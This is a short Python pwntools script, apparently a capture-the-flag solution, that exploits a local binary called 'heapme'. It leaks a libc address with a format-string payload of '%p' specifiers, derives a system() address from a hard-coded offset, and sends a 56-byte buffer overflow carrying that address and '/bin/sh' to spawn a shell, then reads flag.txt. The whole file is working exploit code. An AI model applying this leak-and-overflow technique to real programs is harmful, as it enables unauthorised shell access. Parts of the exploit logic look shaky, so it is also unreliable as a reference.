from pwn import *

io = process("./heapme")

# memory leakage of the printf address since its randomized
io.sendline(b"%p %p %p %p %p")

# reieve address
reg_values = io.recv()

# print("reg values: ", reg_values)
print("printf system address value: ", reg_values.decode().split(" ")[1])

# system call address - 0xfa00 is the offset from print address
sys_add = eval(reg_values.decode().split(" ")[1]) - 0xfa00

# parameters to system call
params = b"/bin/sh"

# input to 2nd gets function
exploitStr = b'a' * 56 + p64(sys_add) + params

io.sendline(exploitStr)

# send input 
io.sendline(b"cat flag.txt")

# print flag
print(io.recv().decode())